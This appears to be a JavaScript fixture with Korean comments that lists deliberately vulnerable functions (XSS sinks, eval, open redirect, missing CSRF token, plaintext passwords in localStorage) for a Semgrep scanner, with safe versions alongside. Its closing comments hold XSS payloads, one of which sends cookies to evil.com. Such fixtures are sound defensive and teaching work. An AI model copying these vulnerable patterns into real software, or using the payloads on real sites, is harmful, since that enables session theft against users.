/**
 * XSS (Cross-Site Scripting) 취약점 예시
 * Semgrep이 감지할 수 있는 취약점
 */

// ❌ 취약점 1: innerHTML로 사용자 입력 직접 삽입
function displayUserComment(comment) {
    const commentDiv = document.getElementById('comments');
    commentDiv.innerHTML += `<div class="comment">${comment}</div>`;
}

// ❌ 취약점 2: document.write 사용
function showWelcome(username) {
    document.write("<h1>Welcome, " + username + "!</h1>");
}

// ❌ 취약점 3: eval로 JSON 파싱
function parseUserData(jsonString) {
    const data = eval("(" + jsonString + ")");
    return data;
}

// ❌ 취약점 4: location.href에 사용자 입력
function redirectUser(url) {
    location.href = url;  // Open Redirect
}

// ❌ 취약점 5: setTimeout에 문자열
function delayedAction(code, delay) {
    setTimeout(code, delay);
}

// ❌ 취약점 6: dangerouslySetInnerHTML (React)
function UserProfile({ bio }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: bio }} />
    );
}

// ❌ 취약점 7: jQuery html() 메서드
function showMessage(message) {
    $('#message-box').html(message);
}

// ❌ 취약점 8: postMessage without origin check
window.addEventListener('message', function(event) {
    // 출처 확인 없음!
    document.getElementById('result').innerHTML = event.data;
});

// ❌ 취약점 9: URL 파라미터를 직접 DOM에 삽입
function displaySearchQuery() {
    const params = new URLSearchParams(window.location.search);
    const query = params.get('q');
    document.getElementById('search-result').innerHTML = `
        <h2>Search results for: ${query}</h2>
    `;
}

// ❌ 취약점 10: localStorage 데이터를 검증 없이 사용
function displayStoredData() {
    const userData = localStorage.getItem('user_data');
    document.body.innerHTML += userData;
}

// ❌ 취약점 11: CSRF - 토큰 없는 폼 제출
function deleteAccount() {
    fetch('/api/delete-account', {
        method: 'POST',
        body: JSON.stringify({ confirm: true })
    });
}

// ❌ 취약점 12: 민감한 정보를 localStorage에 저장
function saveCredentials(username, password) {
    localStorage.setItem('username', username);
    localStorage.setItem('password', password);  // 평문 비밀번호!
}

// ✅ 안전한 방법 (비교용)
function safeDisplayComment(comment) {
    const commentDiv = document.getElementById('comments');
    const div = document.createElement('div');
    div.className = 'comment';
    div.textContent = comment;  // textContent는 안전
    commentDiv.appendChild(div);
}

function safeParseJSON(jsonString) {
    return JSON.parse(jsonString);  // JSON.parse 사용
}

function safeRedirect(url) {
    // URL 검증
    const allowedDomains = ['example.com', 'trusted.com'];
    const urlObj = new URL(url);
    if (allowedDomains.includes(urlObj.hostname)) {
        location.href = url;
    }
}

// ✅ CSRF 토큰 포함
function safeDeleteAccount() {
    const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
    fetch('/api/delete-account', {
        method: 'POST',
        headers: {
            'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({ confirm: true })
    });
}

// 공격 시나리오 예시
// 공격자가 입력: <script>alert(document.cookie)</script>
// 공격자가 입력: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">


